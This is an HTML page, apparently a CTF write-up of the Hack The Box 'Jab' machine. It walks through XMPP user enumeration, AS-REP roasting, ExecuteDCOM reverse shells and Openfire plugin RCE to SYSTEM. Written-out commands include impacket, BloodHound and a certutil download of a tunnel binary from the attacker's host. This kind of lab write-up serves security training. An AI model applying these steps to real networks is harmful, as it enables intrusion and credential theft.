@@ -1,0 +1,135 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Jab | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="/en/index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a data-nav="home" href="/en/index.html">Home</a>
+        <a data-nav="writeups" href="/en/writeups.html">Writeups</a>
+        <a data-nav="scripts" href="/en/scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box - Active Directory</p>
+      <h1>HTB Jab</h1>
+      <p class="headline">XMPP enumeration, AS-REP roasting, ExecuteDCOM and Openfire RCE</p>
+      <p class="meta">Medium - SYSTEM</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+<h2>Executive Summary</h2>
+<p>Jab uses XMPP/Openfire as a major enumeration and access vector. After registering and using Pidgin, user discovery through XMPP exposes enough accounts for AS-REP roasting. Cracking <code>jmontgomery</code> provides access to additional chat rooms, where credentials for <code>svc_openfire</code> are recovered. BloodHound identifies an ExecuteDCOM path for initial code execution. Openfire administrative access is then reached through port forwarding, and a vulnerable Openfire plugin path leads to SYSTEM execution.</p>
+<h2>XMPP Enumeration</h2>
+<p>Port enumeration identified services consistent with a Windows AD host and XMPP/Openfire.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241107193511.png" alt="Open port scan" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241107193757.png" alt="Service enumeration" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108113703.png" alt="NetExec host details" /></figure>
+<p>Users were enumerated with Kerbrute.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108114750.png" alt="Kerbrute user enumeration" /></figure>
+<p>Pidgin was configured for Jabber/XMPP access and a new account was registered.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108115230.png" alt="Pidgin account configuration" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108115248.png" alt="Pidgin connection settings" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108115333.png" alt="Certificate acceptance" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108115432.png" alt="Registration workflow" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108115532.png" alt="Session established" /></figure>
+<p>Conference discovery required adding <code>conference.jab.htb</code> to <code>/etc/hosts</code>.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108115628.png" alt="Room listing" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108115709.png" alt="Conference discovery" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108115848.png" alt="Joining test room" /></figure>
+<p>The user search feature allowed wildcard enumeration through <code>search.jab.htb</code>.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108120355.png" alt="Search for users feature" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108120413.png" alt="search.jab.htb hosts entry" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108120651.png" alt="Wildcard search" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108120712.png" alt="XMPP user enumeration results" /></figure>
+<p>Pidgin debug output was parsed to extract usernames.</p>
+<pre><code class="language-bash">pidgin --debug | tee results.txt
+cat results.txt | grep -oP &#39;(?&lt;=&lt;value&gt;).*?(?=&lt;/value&gt;)&#39; | grep &quot;jab.htb&quot; | sort -u | awk &#39;{print $1}&#39; FS=&quot;@&quot;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108122323.png" alt="Pidgin debug logging" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108123510.png" alt="Username extraction" /></figure>
+<h2>AS-REP Roasting and svc_openfire</h2>
+<p>AS-REP roasting found roastable users.</p>
+<pre><code class="language-bash">impacket-GetNPUsers -no-pass -usersfile users jab.htb/ -output hashes</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108123914.png" alt="AS-REP roasting" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108133441.png" alt="Roastable users" /></figure>
+<p>The <code>jmontgomery</code> hash was cracked.</p>
+<pre><code class="language-text">User: jmontgomery
+Password: Midnight_121</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108134012.png" alt="Hash cracking" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108134245.png" alt="jmontgomery password recovered" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108134416.png" alt="Password validation" /></figure>
+<p>Logging into Pidgin as <code>jmontgomery</code> exposed a new room with credentials for <code>svc_openfire</code>.</p>
+<pre><code class="language-text">User: svc_openfire
+Password: !@#$%^&amp;*(1qazxsw</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108140515.png" alt="Pidgin as jmontgomery" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108140645.png" alt="Additional room discovered" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108140927.png" alt="svc_openfire information" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108141001.png" alt="svc_openfire credential disclosure" /></figure>
+<h2>ExecuteDCOM Initial Shell</h2>
+<p>BloodHound collection with <code>svc_openfire</code> revealed an ExecuteDCOM route.</p>
+<pre><code class="language-bash">bloodhound-python -u &#39;svc_openfire&#39; -p &#39;!@#$%^&amp;*(1qazxsw&#39; -d jab.htb -c all --zip -ns 10.129.230.215</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108152303.png" alt="BloodHound collection" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108152933.png" alt="BloodHound import" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108154255.png" alt="ExecuteDCOM path" /></figure>
+<p>Command execution was validated and then used to launch a PowerShell reverse shell.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108154131.png" alt="DCOM command execution validation" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108154616.png" alt="Nishang reverse shell preparation" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108154900.png" alt="PowerShell base64 encoding" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108155127.png" alt="Netcat listener" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108155513.png" alt="DCOM reverse shell execution" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108155542.png" alt="Reverse shell callback" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108155657.png" alt="User flag" /></figure>
+<h2>Openfire RCE to SYSTEM</h2>
+<p>Openfire was listening locally on ports <code>9090</code> and <code>9091</code>. Chisel exposed it through a reverse tunnel.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108160333.png" alt="Openfire configuration file" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108160554.png" alt="Local listening ports" /></figure>
+<pre><code class="language-bash">chisel server -p 1234 --reverse
+certutil.exe -f -urlcache -split http://10.10.16.40/chisel.exe chisel.exe</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108161255.png" alt="Chisel download" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108161558.png" alt="Chisel server" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108161825.png" alt="Chisel client" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108161927.png" alt="Openfire admin through tunnel" /></figure>
+<p>Openfire access as <code>svc_openfire</code> allowed upload of a management plugin related to CVE-2023-32315, leading to command execution.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108162246.png" alt="Openfire login" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108163207.png" alt="Plugin upload" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108163437.png" alt="Management tool command execution" /></figure>
+<p>A PowerShell reverse shell was executed and returned a SYSTEM shell.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108163927.png" alt="SYSTEM listener" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108163956.png" alt="Command execution from Openfire" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108164955.png" alt="SYSTEM shell" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/jab/Pasted%20image%2020241108165121.png" alt="Root flag" /></figure>
+<h2>Key Takeaways</h2>
+<ul>
+<li>XMPP user search can become a powerful domain enumeration vector.</li>
+<li>Chat rooms often leak operational credentials.</li>
+<li>ExecuteDCOM can provide initial code execution when WinRM is not available.</li>
+<li>Local-only admin panels become reachable through reverse port forwarding.</li>
+</ul>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="/en/writeups.html">Back to writeups</a>
+    </footer>
+
+    <script type="module" src="/src/js/site.js"></script>
+    <script type="module" src="/src/js/writeup-media.js"></script>
+  </body>
+</html>
